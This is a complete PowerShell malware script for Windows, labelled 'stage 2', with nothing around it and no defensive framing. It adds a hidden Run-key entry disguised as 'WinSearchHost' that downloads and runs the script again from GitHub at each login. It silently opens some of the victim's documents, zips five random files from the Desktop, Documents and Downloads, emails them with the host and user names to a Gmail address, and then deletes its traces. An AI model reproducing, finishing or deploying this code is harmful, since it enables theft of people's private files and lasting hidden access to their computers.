# language: PowerShell, file: s2.ps1, target: Windows 10/11, PS 5.1
# stage 2 — persistence + doc-touch + random exfil.

# ---------- CONFIG ----------
$SelfUrl = "https://raw.githubusercontent.com/QmFkLVBp/duqndnaidnznhnyf32yfz18nqynmdbmYQBCMB/main/ps1/s2.ps1"
$Sender     = "vaildus81@gmail.com"
$AppPass    = "FILL_APP_PASSWORD"             # 16-char Gmail app password, not account pass
$Smtp       = "smtp.gmail.com"                # was "://gmail.com" — fix
$Port       = 587
$Receiver   = "vaildus81@gmail.com"
$PickCount  = 5                               # how many random docs to ship
$TouchCount = 20                              # how many to open/close silently

# ---------- 1. PERSISTENCE ----------
try {
    $inner  = "IEX (New-Object Net.WebClient).DownloadString('$SelfUrl')"
    $b64    = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($inner))
    $regVal = "powershell -NoP -NonI -W Hidden -Exec Bypass -enc $b64"
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
                     -Name "WinSearchHost" -Value $regVal -Force
} catch { }

# ---------- 2. ENUMERATE DOCUMENTS ----------
$Exts = @(".doc",".docx",".xls",".xlsx",".ppt",".pptx",".pdf",".txt",".csv",".rtf",".odt")
$Roots = @(
    [Environment]::GetFolderPath("MyDocuments"),
    [Environment]::GetFolderPath("Desktop"),
    "$env:USERPROFILE\Downloads"
) | Where-Object { $_ -and (Test-Path $_) }

$Files = foreach ($r in $Roots) {
    Get-ChildItem -Path $r -Recurse -File -ErrorAction SilentlyContinue |
        Where-Object { $Exts -contains $_.Extension.ToLower() }
}
$Files = @($Files | Sort-Object FullName -Unique)

# ---------- 3. HIDDEN OPEN / CLOSE ----------
function Touch-Com($Path) {
    $ext = [IO.Path]::GetExtension($Path).ToLower()
    $prog = switch ($ext) {
        ".doc"  { "Word.Application" }
        ".docx" { "Word.Application" }
        ".xls"  { "Excel.Application" }
        ".xlsx" { "Excel.Application" }
        ".ppt"  { "PowerPoint.Application" }
        ".pptx" { "PowerPoint.Application" }
        default { $null }
    }
    if (-not $prog) { return $false }
    try {
        $app = New-Object -ComObject $prog
        if ($prog -eq "Word.Application" -or $prog -eq "Excel.Application") {
            $app.Visible = $false
        }
        $doc = $app.Documents.Open($Path, $false, $true)   # read-only, no dialog
        Start-Sleep -Milliseconds 400
        $doc.Close($false)
        $app.Quit()
        [Runtime.InteropServices.Marshal]::ReleaseComObject($app) | Out-Null
        return $true
    } catch { return $false }
}

function Touch-Raw($Path) {
    try {
        $p = Start-Process -FilePath $Path -WindowStyle Hidden -PassThru -ErrorAction Stop
        Start-Sleep -Milliseconds 700
        if ($p -and -not $p.HasExited) { $p | Stop-Process -Force -ErrorAction SilentlyContinue }
    } catch { }
}

$touchSet = @($Files | Get-Random -Count ([Math]::Min($TouchCount, $Files.Count)))
foreach ($f in $touchSet) {
    if (-not (Touch-Com $f.FullName)) { Touch-Raw $f.FullName }
}

# ---------- 4. RANDOM PICK + ZIP ----------
if ($Files.Count -eq 0) { return }

$picked = @($Files | Get-Random -Count ([Math]::Min($PickCount, $Files.Count)))
$stage  = Join-Path $env:TEMP ("~" + [guid]::NewGuid().ToString("N").Substring(0,8))
$zip    = "$stage.zip"

try {
    New-Item -ItemType Directory -Path $stage -Force | Out-Null
    $i = 0
    foreach ($f in $picked) {
        $i++
        $safe = "{0:D2}_{1}" -f $i, $f.Name
        Copy-Item -LiteralPath $f.FullName -Destination (Join-Path $stage $safe) -Force -ErrorAction SilentlyContinue
    }

    Compress-Archive -Path "$stage\*" -DestinationPath $zip -Force -ErrorAction Stop

    # Gmail hard cap ~25 MB — check before send
    if ((Get-Item $zip).Length -lt 24MB) {
        $sec  = ConvertTo-SecureString $AppPass -AsPlainText -Force
        $cred = New-Object System.Management.Automation.PSCredential ($Sender, $sec)
        $body = "files: $($picked.Count)`nhost: $env:COMPUTERNAME`nuser: $env:USERNAME`nwhen: $(Get-Date -Format o)"
        Send-MailMessage -From $Sender -To $Receiver `
            -Subject "archive $(Get-Date -Format yyyyMMdd-HHmm)" `
            -Body $body -Attachments $zip `
            -SmtpServer $Smtp -Port $Port -UseSsl -Credential $cred `
            -Encoding ([Text.Encoding]::UTF8) -ErrorAction Stop
    }
} catch { }

# ---------- 5. CLEAN ----------
try { Remove-Item $stage -Recurse -Force -ErrorAction SilentlyContinue } catch { }
try { Remove-Item $zip   -Force -ErrorAction SilentlyContinue } catch { }
